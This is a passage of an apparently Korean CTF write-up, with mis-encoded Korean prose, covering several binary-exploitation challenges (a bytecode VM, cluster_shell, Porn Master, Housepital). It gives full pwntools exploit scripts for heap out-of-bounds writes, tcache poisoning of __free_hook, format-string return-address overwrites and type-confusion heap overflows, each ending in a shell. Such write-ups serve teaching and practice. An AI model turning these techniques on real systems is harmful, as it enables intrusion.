RETURN</code></pre><p id="84143b82-2aac-47df-b8d9-551bab5f0f0f" class="">pwn.asmì—ì„œ í‘œí˜„ëœ 18x, 19x ë“±ì˜ ë ˆì§€ìŠ¤í„°ëŠ” ì›ë˜ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ë ˆì§€ìŠ¤í„°ë¡œ, return addressë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì¡°ì‘ëœ opcodeì´ë‹¤.</p><p id="43d2d7d2-326b-47a3-a154-800f918919ab" class="">
</p><p id="94f9d612-546c-412c-ac9b-a9dfedfc6a75" class=""><strong>exploit poc</strong></p><pre id="33143017-4f23-4ba7-b80b-bacbfe3063f7" class="code code-wrap"><code>#!/usr/bin/env python3
from pwn import *
import hashlib, secrets, re

r = remote(&quot;localhost&quot;, 12001)
p = r.recvline().strip().decode()
k, v = re.findall(r&#x27;\&quot;[^)]*\&quot;&#x27;, p)
k, v = k[1:-1], v[1:-1]
log.info(&quot;parsed (k, v) = ({}, {})&quot;.format(k, v))

pg = log.progress(&quot;PoW&quot;)
pg.status(&quot;solving ...&quot;)

while True:
    x = secrets.token_hex(5)
    if hashlib.sha256((k + x).encode()).hexdigest()[:5] == v:
        pg.success(&quot;solved [x = {}]&quot;.format(x))
        break

payload = &quot;QlZNAAYSABoALAA+AFAAYgAFAAAAAAAAAAABAgAAGQISEQACAgIBAAweAA4BAgAAGQITEQACAgIBAAwwAA4BAgAAGQIUEQACAgIBAAxCAA4BAgAAGQIVEQACAgIBAAxUAA4NGgBBAQACAQAAMQEADSwAQQEAAgECADEBAA0+AEEBAAIBBAAxAQANUABBAQACAQYAMQEAAQIIAEEBAAEAAQAPAQAAAA8BAQAAQQAAIQMABxIDAQIAAgAhAwAHEwMBAgACACEDAAcUAwECAAIAIQMABxUDAQ4=&quot;
# payload = b64e(open(&quot;pwn.bvm&quot;, &quot;rb&quot;).read()
r.sendlineafter(&quot;x = &quot;, x)
r.sendlineafter(&quot;&gt; &quot;, payload)

r.recvuntil(&quot;loading ...\n&quot;)
libc = u64(r.recvn(8)) - 0x021b97 # libc_base
r.info(&quot;libc: {:x}&quot;.format(libc))
r.send(p64(libc + 0x4f365)) # oneshot
r.interactive()

# cat flag
# bob{B0undary_cheCK_1s_e2sy_T0_f0rg2t}</code></pre><p id="175f865e-234c-4491-bc22-9296f3c1e2b6" class="">
</p><h2 id="c4a067f0-9fd9-4412-ac59-15f4e6eb9bdd" class="">cluster_shell</h2><hr id="b01f7733-4278-4993-a130-c2e9bd202896"/><figure id="3384d566-cb20-4ad6-84f5-f8c05116b9e7" class="image"><a href="/assets/2020-09-01/bob/bob966.png"><img style="width:1197px" src="/assets/2020-09-01/bob/bob966.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="46a5a776-6c3e-4718-8cce-827fd79c16f4"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">libc 2.31 heap oobë¬¸ì œ</div></figure><ul id="268f52f2-ff0d-40d7-9bed-66d5c10bc2f6" class="bulleted-list"><li>vimì²˜ëŸ¼ ë§Œë“  ë©”ëª¨ì¥ ê¸°ëŠ¥ê³¼ ìœ ì‚¬ ì‰˜ í”„ë¡¬í”„íŠ¸</li></ul><pre id="1d299947-80fd-4735-89b1-14fe98ab0551" class="code"><code>sh# help
========================================
help    - Help
ls      - List of files
cat     - Print the contents
rm      - Remove file
vim     - Text editor
========================================
sh# ls
 - 1
sh# cat 1

 aaaa

sh# vim 1
##################
#_aaaa...........#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
#................#
##################</code></pre><ul id="fa4ee743-2714-4392-ac1a-69bfbeaa50b9" class="bulleted-list"><li>vimìœ¼ë¡œ íŒŒì¼ì„ í•˜ë‚˜ ë§Œë“¤ë•Œ ë§ˆë‹¤ í™ì— 0x110í¬ê¸°ì˜ ì²­í¬ë¥¼ í• ë‹¹í•œë‹¤. <strong>rm</strong>ìœ¼ë¡œ ì‚­ì œí• ë•Œ ë§ˆë‹¤ freeë¡œ ì²­í¬ í•´ì œ ê°€ëŠ¥. ë”± ë´ë„ ë©”ëª¨ë¦¬ì— ë­”ê°€ ì“°ê±°ë‚˜ í•  ìˆ˜ ìˆëŠ”ê²Œ <strong>vim</strong>ê¸°ëŠ¥ë°–ì— ì—†ê¸° ë•Œë¬¸ì— vimì½”ë“œë¡œ ê°„ë‹¤.</li></ul><ul id="12ba6e80-264c-4687-9af3-72adbc565a49" class="bulleted-list"><li>sub_1980ê°€ <strong>vim</strong>ì½”ë“œì´ê³ , ì•ˆì˜ ë¶„ê¸°ì— sub_14E2ê°€ <strong>vim</strong>ëª¨ë“œì—ì„œ ì»¤ì„œë¥¼ ì›€ì§ì´ëŠ” ì½”ë“œ. switchë¬¸ìœ¼ë¡œ jmpë¡œ í•´ë‹¹ ë£¨í‹´ìœ¼ë¡œ ë“¤ì–´ê°„ë‹¤. sub_149Eê°€ oobë°©ì§€ë¥¼ ìœ„í•œ boundary checkí•¨ìˆ˜</li></ul><figure id="1cf3fbf3-ba20-4813-98a1-da7ab241485f" class="image"><a href="/assets/2020-09-01/bob/bob967.png"><img style="width:1284px" src="/assets/2020-09-01/bob/bob967.png"/></a></figure><ul id="9a5780e3-8b25-42a4-8972-9a426d989d23" class="bulleted-list"><li>qword_5058ì´ vimëª¨ë“œì—ì„œ ì»¤ì„œì˜ ìœ„ì¹˜ì´ë‹¤. ì»¤ì„œì˜ ìœ„ì¹˜ê°€ ì›€ì§ì´ëŠ” ì½”ë“œì—ëŠ” ëª¨ë‘ ìœ„ boundary checkí•¨ìˆ˜ê°€ ìˆì–´ì•¼ í•œë‹¤.</li></ul><figure id="28b42b72-241d-4d9e-98e0-7a66fcd54c89" class="image"><a href="/assets/2020-09-01/bob/bob968.png"><img style="width:718px" src="/assets/2020-09-01/bob/bob968.png"/></a></figure><ul id="024a64ae-38b3-4544-b3f1-5300aeb2316b" class="bulleted-list"><li>í•˜ì§€ë§Œ ê°™ì€ ì˜ì—­ë‚´ì— boundary checkí•¨ìˆ˜ ì—†ì´ ì»¤ì„œì˜ ìœ„ì¹˜ë¥¼ ì¡°ì‘í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤. ì´ë¥¼ ì´ìš©í•´ vim noteë‚´ì—ì„œ oobì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ì—¬ í™ ì˜ì—­ë‚´ì— ì²­í¬ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="0fb32703-28ee-40f4-9357-e84dcf18a0a1" class="bulleted-list"><li>switchë¬¸ì„ ë¶„ì„í•˜ë©´ jmpì½”ë“œë¥¼ ì–´ë””ë¡œ íƒˆì§€ í…Œì´ë¸”ì´ ìˆë‹¤.</li></ul><pre id="afa02dbf-3eee-4a2c-85a3-5628807d5340" class="code"><code>0x800153c:   lea    0x1ac5(%rip),%rdx        # 0x8003008
=&gt; 0x8001543:   add    %rdx,%rax
   0x8001546:   notrack jmpq *%rax</code></pre><ul id="70cb4eee-c75c-4cb1-b79b-9bcd63a4dbc7" class="bulleted-list"><li><code>0x8003008 </code>+ [í…Œì´ë¸” ë°ì´í„°]ë¡œ ì í”„ë¥¼ íƒ€ëŠ”ë° ì í”„ë¥¼ íƒˆ ê³³ì„ ìœ„ì—ì„œ ì°¾ì€ ì·¨ì•½í•œ í•¨ìˆ˜ê°€ ìˆëŠ”ê³³ì„ ì°¾ëŠ”ë‹¤. ì°¾ëŠ” ê°’ì€ 0x8003008 + X = 0x8001608ì´ë¯€ë¡œ </li></ul><pre id="b35700c8-85ac-427a-8f88-075a470c18f2" class="code"><code>&gt;&gt;&gt; hex(0x8001608-0x8003008&amp;0xffffffff)
&#x27;0xffffe600&#x27;</code></pre><ul id="786866bd-d50f-4f75-a077-0b7adf327679" class="bulleted-list"><li>í•´ë‹¹ ê°’ì€ 0x8003008[0x27]ë²ˆì§¸ì— ìˆë‹¤.</li></ul><pre id="12dd0142-301d-4429-9b11-ec56d1aa5ff8" class="code"><code>(gdb) x/128wx 0x8003008
0x8003008:      0xffffe640      0xffffe64e      0xffffe64e      0xffffe64e
0x8003018:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003028:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003038:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003048:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003058:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003068:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003078:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003088:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x8003098:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe600
0x80030a8:      0xffffe64e      0xffffe64e      0xffffe64e      0xffffe64e
0x80030b8:      0xffffe64e      0xffffe64e      0xffffe541      0xffffe5f2
0x80030c8:      0xffffe56f      0xffffe59d      0xffffe5cb      0xffffe64e
0x80030d8:      0xffffe64e      0xffffe620      0x6f4e0020      0x6c696620
(gdb) x/wx 0x8003008+0x27*4
0x80030a4:      0xffffe600</code></pre><pre id="0174c620-9b4f-4db6-834c-200613231369" class="code"><code>.text:0000000000001513                 movzx   eax, byte ptr [rbp-9]
.text:0000000000001517                 movsx   eax, al
.text:000000000000151A                 sub     eax, 3Ah ; &#x27;:&#x27;
.text:000000000000151D                 cmp     eax, 35h ; &#x27;5&#x27;
.text:0000000000001520                 ja      loc_1656
.text:0000000000001526                 mov     eax, eax</code></pre><ul id="17188f40-0a5d-4f06-9cdd-88f52336d76d" class="bulleted-list"><li>switchê³„ì‚°ì—ì„œ [ì‚¬ìš©ìì˜ ì…ë ¥] - 0x3aë¥¼ í•˜ë‹ˆ ë”í•˜ë©´ ë¬¸ì <code>a</code>ê°€ ëœë‹¤.</li></ul><pre id="5e26b160-6808-44ca-9b03-66c5ed232368" class="code"><code>&gt;&gt;&gt; chr(0x27+0x3a)
&#x27;a&#x27;</code></pre><ul id="5001c764-b830-480b-8f3c-3b896c4a38af" class="bulleted-list"><li>vimëª¨ë“œì—ì„œ aë¬¸ìë¥¼ ì…ë ¥í•  ì‹œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œì˜ ì‹¤í–‰ì„ ì•Œê²Œ ëœë‹¤.</li></ul><pre id="ff75e39c-93fa-42de-bb47-a682135b1fa7" class="code"><code>mov     rax, cs:qword_5058
add     rax, 1
mov     cs:qword_5058, rax
mov     eax, 0ABCD0001h
mov     cs:qword_5010, rax
jmp     short loc_1663</code></pre><ul id="ba232c9d-1671-40cf-a322-552fa302ecff" class="bulleted-list"><li>ì´ ë’¤ë¶€í„°ëŠ” oobë¥¼ ì´ìš©í•´ ì½”ë“œë¥¼ ë³¼ í•„ìš” ì—†ì´ ë©”ëª¨ë¦¬ë§Œ ë³´ë©´ì„œ ì·¨ì•½ì ì˜ íŠ¸ë¦¬ê±°ê°€ ê°€ëŠ¥í•˜ë‹¤.</li></ul><ul id="0a8ac1f1-e1b2-48d1-b8a4-38c58987aafe" class="bulleted-list"><li>ë‹¤ì–‘í•œ ë°©ë²•ìœ¼ë¡œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìˆì§€ë§Œ ë‚˜ëŠ” tcache bin attackìœ¼ë¡œ <code>__free_hook</code>ì— <code>system</code>ì„ ë®ì–´ì„œ íŠ¸ë¦¬ê±°í•˜ì˜€ë‹¤.</li></ul><pre id="c4780ac6-195c-4ac8-b9a2-f7be6c6eed9c" class="code"><code>alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)</code></pre><ul id="14d712ca-77e3-45de-91e0-7853e05ac5db" class="bulleted-list"><li>heap chunk 6ê°œ í• ë‹¹í•˜ê³  1ë²ˆ í™ì˜ í¬ê¸°ë¥¼ 0x480ìœ¼ë¡œ ë°”ê¿” unsorted binìœ¼ë¡œ ë°”ê¾¸ê³  í•´ì œí•˜ì—¬ libcì˜ ì£¼ì†Œë¥¼ ë°”ë¡œ êµ¬í•  ìˆ˜ ìˆë‹¤. <code>oob</code>ëŠ” 0ë²ˆì§¸ í™ ì²­í¬ì˜ ë°”ë¡œ ë’¤ì— ì ê¸° ì‹œì‘í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</li></ul><pre id="4d751d33-b462-4234-914e-7eecce46b9a2" class="code"><code>free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b&quot;A&quot; * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b&quot;A&quot; * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols[&#x27;__free_hook&#x27;]-0x10)
oob(0, payload)</code></pre><ul id="6381a658-ba03-498d-bfdf-2a02fa64ba41" class="bulleted-list"><li>4ë²ˆ 3ë²ˆ ì²­í¬ë¥¼ í•´ì œí•´ tcache binì„ ë§Œë“¤ê³  ìœ„ì—ì„œ leakí•œ libcì˜ ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ oobì·¨ì•½ì ìœ¼ë¡œ tcache binì˜ ë‹¤ìŒ í• ë‹¹ë  ê³µê°„ì„ ë°”ê¾¼ë‹¤. tcache binì€ ì‚¬ì´ì¦ˆ ì²´í¬ê°™ì€ ê·€ì°®ì€ê²Œ ì—†ì–´ì„œ í¸í•˜ë‹¤.</li></ul><pre id="9a3bed85-09fb-4a16-98cf-8797fe8c23d1" class="code"><code>alloc(&#x27;AA&#x27;)
p.sendlineafter(&quot;sh# &quot;, f&quot;vim /bin/sh&quot;)
p.recvuntil(&quot;#&quot; * 0x10)
p.sendline(b&quot;i&quot; + p64(libc + e.symbols[&#x27;system&#x27;]))
p.recvuntil(&quot;#&quot; * 0x10)
p.sendline(&quot;:q&quot;)
free(&#x27;/bin/sh&#x27;)</code></pre><ul id="79370a41-ee37-46b7-98fd-22fac7b15c4a" class="bulleted-list"><li><code>__free_hook</code>ì„ <code>system</code>ìœ¼ë¡œ ë®ê³  í˜¸ì¶œ.</li></ul><p id="39d55a85-9e25-4157-b9a8-71933bc15791" class="">
</p><h3 id="15cf535e-4d94-42ad-bcbc-16797253edff" class="">exploit</h3><pre id="6bbc7b6d-26d4-4394-9691-e746f980c5d3" class="code"><code>#!/usr/bin/env python3

&#x27;&#x27;&#x27;
cluster_shell

in honestly, this is not has a relationship the clustering.

nc pwn.wwwlk.kr 13337

libc: http://pwn.wwwlk.kr/libc.so.6
md5: 10fdeb77eea525914332769e9cd912ae

binary: http://pwn.wwwlk.kr/cluster_shell
md5: a5960d98860dc3d5bf82ba82b0fe6dca
&#x27;&#x27;&#x27;

from pwn import *

# context.log_level = &#x27;debug&#x27;

def alloc(n):
   p.sendlineafter(&quot;sh# &quot;, f&quot;vim {n}&quot;)
   p.recvuntil(&quot;#&quot; * 0x10)
   p.recvuntil(&quot;#&quot; * 0x10)
   p.sendline(&quot;:q&quot;)

def free(n):
   p.sendlineafter(&quot;sh# &quot;, f&quot;rm {n}&quot;)

def oob(n, value):
   p.sendlineafter(&quot;sh# &quot;, f&quot;vim {n}&quot;)
   p.sendline(b&quot;j&quot; * 0xf + b&quot;l&quot; * 0xf + b&#x27;a&#x27; + value)
   p.sendline(&quot;:q&quot;)

gdbscript = &#x27;&#x27;&#x27;
codebase
c
&#x27;&#x27;&#x27;

p = process(&quot;./a.out&quot;)
e = ELF(&quot;./libc.so.6&quot;)

alloc(0)
alloc(1)
alloc(2)
alloc(3)
alloc(4)
alloc(5)

oob(0, p64(0x0) + p64(0x481))
free(1)
alloc(1)

p.sendlineafter(&quot;sh# &quot;, &quot;ls&quot;)
p.recvuntil(&quot; - &quot;)
p.recvuntil(&quot; - &quot;)
p.recvuntil(&quot; - &quot;)
leak = u64(p.recvline().strip().ljust(8, b&#x27;\x00&#x27;))
libc = leak - 0x1ebbe0
log.info(f&quot;leak: 0x{leak:x}&quot;)

free(4)
free(3)

payload = p64(0x0) + p64(0x121)
payload += b&quot;A&quot; * 0x110
payload += p64(0x0) + p64(0x361)
payload += p64(leak)
payload += p64(leak)
payload += b&quot;A&quot; * (0x110-0x10)
payload += p64(0x0) + p64(0x121)
payload += p64(libc + e.symbols[&#x27;__free_hook&#x27;]-0x10)
oob(0, payload)

alloc(&#x27;AA&#x27;)
p.sendlineafter(&quot;sh# &quot;, f&quot;vim /bin/sh&quot;)
p.recvuntil(&quot;#&quot; * 0x10)
p.sendline(b&quot;i&quot; + p64(libc + e.symbols[&#x27;system&#x27;]))
p.recvuntil(&quot;#&quot; * 0x10)
p.sendline(&quot;:q&quot;)
free(&#x27;/bin/sh&#x27;)

p.interactive()</code></pre><p id="02935868-0961-45a1-b15e-1842d669f01d" class="">
</p><h2 id="05725414-0b62-484a-9bb5-7fecd7c05c17" class="">Porn Master</h2><hr id="43ee107b-f904-4e22-88b3-a41b62d793f5"/><figure id="cef5d68c-6308-47b6-ab23-293c58fca1c0" class="image"><a href="/assets/2020-09-01/bob/bob969.png"><img style="width:711px" src="/assets/2020-09-01/bob/bob969.png"/></a></figure><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="415c2f77-03b9-4e20-8f54-0c1c046b714f"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">Format String Bugë¥¼ ì´ìš©í•œ stack ì˜ì—­ ë³€ì¡° ë° ì‰˜ íšë“ (glibc 2.27)</div></figure><ul id="091827e8-a739-42b6-a249-1056523da8ee" class="bulleted-list"><li>ë³´í˜¸ê¸°ë²•</li></ul><pre id="7ef78cd9-89a3-411a-9dbd-91c883184a81" class="code"><code>Canary                        : âœ“
NX                            : âœ“
PIE                           : âœ“
Fortify                       : âœ˜
RelRO                         : Full</code></pre><ul id="d069b597-7255-4883-b9fb-88ba2e4b1af8" class="bulleted-list"><li>ì‹¤í–‰ê²°ê³¼</li></ul><figure id="bf907ee9-1171-4d8b-a2fd-cb7499c76a9c" class="image"><a href="/assets/2020-09-01/bob/bob970.png"><img style="width:480px" src="/assets/2020-09-01/bob/bob970.png"/></a></figure><ul id="4d076f7e-878e-4c37-8408-43f3ba9ef417" class="bulleted-list"><li>ì½”ë“œí™•ì¸</li></ul><ul id="65e6aecf-9fdc-471b-9568-55fd5c2ca6c9" class="bulleted-list"><li>ì‚¬ìš©ìì—ê²Œ name ì„ 0x64 ì‚¬ì´ì¦ˆë§Œí¼ ì…ë ¥ì„ ë°›ìœ¼ë©° í™ ì˜ì—­ì— ì €ì¥ì„ í•œë‹¤.</li></ul><ul id="a95c75ca-7150-49f2-a78c-b0a3d5f69e88" class="bulleted-list"><li>ë˜í•œ, ì‚¬ìš©ìì—ê²Œ 0x18 ì‚¬ì´ì¦ˆë§Œí¼ ì…ë ¥ì„ ë°›ì•„ ìŠ¤íƒì— ì €ì¥í•˜ë©°, ì…ë ¥ê³¼ ì¶œë ¥ì„ ê° 2ë²ˆì”© ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ì˜ì—­ì—ì„œ <code>FSB</code> ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="563063b7-0a2b-45a8-89b3-d741e4e97222" class="image"><a href="/assets/2020-09-01/bob/bob971.png"><img style="width:384px" src="/assets/2020-09-01/bob/bob971.png"/></a></figure><ul id="f926d7d7-5a7a-4a11-a1d7-979eae13d8f8" class="bulleted-list"><li>ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” <code>printf</code> ì— ë¸Œë ˆì´í¬í¬ì¸íŠ¸ ì§€ì • í›„ ë””ë²„ê±° í™•ì¸</li></ul><ul id="373d0731-a36f-4319-a7c8-507b53ba29c9" class="bulleted-list"><li>ë””ë²„ê±°ë¥¼ í†µí•´ ìŠ¤íƒì„ í™•ì¸í•  ì‹œ <code>0x00007ffd8e961198</code> ì£¼ì†Œê°€ <code>0x00007ffd8e96118c</code> (ë³€ìˆ˜ i)ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° ë³€ìˆ˜(idx)ì¸ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì¦‰, í•´ë‹¹ì˜ì—­ì„ FSBë¥¼ í†µí•´ ë³€ì¡°í•  ì‹œ ë¬´ì œí•œìœ¼ë¡œ ì…ì¶œë ¥ í•  ìˆ˜ ìˆë‹¤.</li></ul><ul id="bc8bb230-714e-434f-b840-e054f0fe437a" class="bulleted-list"><li>ë”°ë¼ì„œ, stack ë° libc leak ì´í›„ ret ë¥¼ oneshot ìœ¼ë¡œ ë³€ì¡°í•˜ì—¬ exploit í•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="bafadaca-1721-4b64-9639-3ff48d0bbf18" class="image"><a href="/assets/2020-09-01/bob/bob972.png"><img style="width:1438px" src="/assets/2020-09-01/bob/bob972.png"/></a></figure><ul id="01773885-913c-4d48-bae8-f46f84ec2579" class="bulleted-list"><li>exploit code</li></ul><pre id="5e10b775-d207-4d06-9a7c-c4911a9151fd" class="code"><code>from pwn import *

bi = &#x27;./pwn&#x27;
r = process([bi])
#r = remote(&#x27;localhost&#x27;, 12002)

def reset():
    pay = &#x27;%11$n&#x27;
    r.sendlineafter(&#x27;&gt; &#x27;, pay )

r.sendlineafter(&#x27;: &#x27;, &#x27;gpsfly&#x27;)

pay = &#x27;%17$p&#x27;
r.sendlineafter(&#x27;&gt; &#x27;, pay )
libc = int(r.recvline().strip(), 16) - 0x21b97
log.info(&quot;libc @ {}&quot;.format(hex(libc)))
reset()

pay = &#x27;%11$p&#x27;
r.sendlineafter(&#x27;&gt; &#x27;, pay)
stack = int(r.recvline().strip(), 16) - 0xc + 0x48
log.info(&quot;stack @ {}&quot;.format(hex(stack)))
reset()

oneshot = libc+0x4f2c5
oneshot = p64(oneshot)[:6]

for i in range(6):
    pay = &#x27;%{}c%14$hhn&#x27;.format(ord(oneshot[i]))
    pay = pay.ljust(0x10,&#x27;A&#x27;)
    pay += p64(stack+i)[:6]
    r.sendlineafter(&#x27;&gt; &#x27;, pay)
    reset()

r.sendlineafter(&#x27;&gt; &#x27;,&#x27;&#x27;)
r.sendlineafter(&#x27;&gt; &#x27;,&#x27;&#x27;)

r.interactive()</code></pre><p id="47e9bf38-b477-4494-9833-b203aefeeb92" class="">
</p><h2 id="6dc64837-93f5-489e-9547-e3846f86dd3d" class="">Housepital</h2><hr id="0ac76e2c-2e8f-4b08-83ce-89a772abc114"/><figure id="e46a7d3f-3b2d-4333-801c-5b76026eab7e" class="image"><a href="/assets/2020-09-01/bob/bob973.png"><img style="width:792px" src="/assets/2020-09-01/bob/bob973.png"/></a></figure><ul id="0dd7d2d2-feac-4733-86a9-1c90d8aba9de" class="bulleted-list"><li>ë³´í˜¸ê¸°ë²•</li></ul><pre id="4cfb2688-243d-4180-9597-3b9f3d4a514f" class="code"><code>Canary                        : âœ“
NX                            : âœ“
PIE                           : âœ“
Fortify                       : âœ˜
RelRO                         : Full</code></pre><ul id="579ef8ba-bfd7-4e3e-9c3c-9738e95046a7" class="bulleted-list"><li>ì‹¤í–‰ê²°ê³¼</li></ul><ul id="cf3d2044-03a9-4eff-886c-a159c65ef246" class="bulleted-list"><li>í•´ë‹¹ ë°”ì´ë„ˆë¦¬ëŠ” <code>add</code>, <code>view</code>, <code>delete</code> 3ê°€ì§€ ê¸°ëŠ¥ì´ ìˆìœ¼ë©° í™ ì˜ì—­ì— ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ì—¬ ì“°ê³ , ì½ê³ , í•´ì œí•  ìˆ˜ ìˆë‹¤.</li></ul><figure id="cf104a8c-aa8e-4c29-b80f-821898aea1c5" class="image"><a href="/assets/2020-09-01/bob/bob974.png"><img style="width:288px" src="/assets/2020-09-01/bob/bob974.png"/></a></figure><ul id="d6019bb9-0bec-4cb8-93b1-195a6faba6af" class="bulleted-list"><li>êµ¬ì¡°ì²´ í™•ì¸</li></ul><pre id="6c6ff75a-d50b-4eb2-8adc-99a65f397cb6" class="code"><code>struct Patient
{
    char name[0x24]; # 24 bytes
    unsigned int age; # 4 bytes
    size_t gender; # 8 bytes
    char *sickness; # 8 bytes
};</code></pre><ul id="dadb3c00-fc39-471e-8c09-f46cddf43be6" class="bulleted-list"><li>ì·¨ì•½ì  í™•ì¸ (add function)</li></ul><ul id="23ffefcc-b536-4080-8929-54f42326fce5" class="bulleted-list"><li>25 line ì— scanf í•¨ìˆ˜ í˜¸ì¶œ ì‹œ <code>%lld</code> í¬ë§·ì€ 8 ë°”ì´íŠ¸ ì…ë ¥ì„ ë°›ìœ¼ë©°, patient_list[i]â†’age ë³€ìˆ˜ëŠ” unsigned int (4 ë°”ì´íŠ¸)í˜• ë³€ìˆ˜ ì´ë¯€ë¡œ í•´ë‹¹ ì½”ë“œì—ì„œ <code>Type Confusion</code> ì´ ë°œìƒí•œë‹¤.</li></ul><ul id="ed7215d0-ac68-4ecf-8427-6eb9f71caae3" class="bulleted-list"><li>ì´ë¥¼ í†µí•´ ì•„ë˜ 26 line ë° 47 line ì„ í†µí•´ 0x40 chunk ë¥¼ í• ë‹¹ë°›ì•„ 0x80 ì‚¬ì´ì¦ˆ ë§Œí¼ ì…ë ¥ì„ ë°›ëŠ” ë“± <code>Heap Overflow</code>ë¡œ ì•…ìš© ê°€ëŠ¥í•˜ë‹¤.</li></ul><figure id="e56beb6d-1a5b-47f9-afb0-70085995e455" class="image"><a href="/assets/2020-09-01/bob/bob975.png"><img style="width:432px" src="/assets/2020-09-01/bob/bob975.png"/></a></figure><ul id="dada12e4-c702-487b-8a56-d4b9ce9bf2df" class="bulleted-list"><li>exploit plan<ol id="a43e8f44-8795-40d8-bba1-43925db1bde9" class="numbered-list" start="1"><li>libc leak<p id="816d62d2-8857-4e7f-84aa-b289b3b67599" class="">1.1. 0x420 ì´ìƒì˜ ì²­í¬ë¥¼ ë§Œë“  ë’¤ free í•˜ì—¬ <code>unsorted bin</code> (libc-main_arena) ìƒì„±</p><p id="9f8409ef-087f-4e76-854f-28da73426045" class="">1.2. view ë©”ë‰´ë¥¼ í†µí•´ libc ì£¼ì†Œ leak</p></li></ol><ol id="2c9e40e8-d4b0-4300-8d2d-11bd268a5c46" class="numbered-list" start="2"><li>rip ë³€ì¡°<p id="e188edc1-eaea-49a0-b938-1989dbbf278c" class="">2.1. tcache bin ì˜ fd ë¥¼ <code>__malloc_hook</code> ë˜ëŠ” <code>__free_hook</code> ì£¼ì†Œë¡œ ë³€ì¡°</p><p id="99db06d2-aed7-44c9-8664-d386d755756a" class="">2.2. tcache chunk í• ë‹¹ ì‹œ <code>oneshot</code> ë˜ëŠ” <code>system</code> ì£¼ì†Œë¡œ ë³€ì¡°</p><p id="6d157398-e3d4-4e48-b251-60a0973f2ab7" class="">2.3. malloc ë˜ëŠ” free í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ íŠ¸ë¦¬ê±°</p><ul id="3422e1bf-c20f-4ee1-b751-431c70c44b17" class="bulleted-list"><li>__free_hook ì„ system ì£¼ì†Œë¡œ ë³€ì¡° í•˜ì˜€ì„ ê²½ìš° í™ ë©”ëª¨ë¦¬ì— <code>&quot;/bin/sh&quot;</code> ë¬¸ìì—´ ì €ì¥ í›„ í˜¸ì¶œ</li></ul></li></ol></li></ul><ul id="c17fd4a3-7363-443e-b92f-951f79e9aa14" class="bulleted-list"><li>exploit code</li></ul><pre id="436cadfc-cc4a-4d0d-ae69-735e6ea16ba3" class="code"><code>from pwn import *

bi = &#x27;./pwn&#x27;
r = process([bi])
#r = remote(&#x27;localhost&#x27;, 12003)
e = ELF(bi)
l = ELF(&#x27;libc.so.6&#x27;)
xla = lambda x : r.sendlineafter(&#x27;: &#x27;, str(x))
xa = lambda x : r.sendafter(&#x27;: &#x27;, str(x))
add = lambda name,gender,age,sickness : [xla(&#x27;1&#x27;), xa(name), xla(gender), xla(age), xa(sickness)]
view = lambda idx : [xla(&#x27;2&#x27;), xla(idx)]
dele = lambda idx : [xla(&#x27;3&#x27;), xla(idx)]


[add(&#x27;Z&#x27;, 0, 0xff, &#x27;A&#x27;) for _ in range(2)]

add(&#x27;Z&#x27;, 0, 0xff, &#x27;A&#x27;)
[add(&#x27;A&#x27;, 1, 0xff, &#x27;A&#x27;) for _ in range(5)]
add(&#x27;A&#x27;*8+p64(0x31), 1, 0xff, &#x27;A&#x27;)
dele(2)
pay = &#x27;A&#x27;*0x40
pay += p64(0) + p64(0x421)
add(&#x27;Z&#x27;, 0, 0x1000000ff, pay)
dele(3)
dele(2)
pay = &#x27;A&#x27;*0x50
add(&#x27;Z&#x27;, 0, 0x1000000ff, pay)
view(2)
r.recvuntil(&#x27;sickness : {}&#x27;.format(&#x27;A&#x27;*0x50))
libc = u64(r.recvline().strip().ljust(8,&#x27;\x00&#x27;)) - l.sym[&#x27;__malloc_hook&#x27;] - 0x70
log.info(&quot;libc @ {}&quot;.format(hex(libc)))

dele(2)
dele(4)
dele(5)
dele(6)

dele(1)
dele(0)
pay = &#x27;A&#x27;*0x40
pay += p64(0) + p64(0x41)
pay += p64(libc+l.sym[&#x27;__free_hook&#x27;])
add(&#x27;Z&#x27;, 0, 0x1000000ff, pay)

[add(p64(libc+l.sym[&#x27;system&#x27;]), 0, 0xff, &#x27;/bin/sh&#x27;) for _ in range(2)]
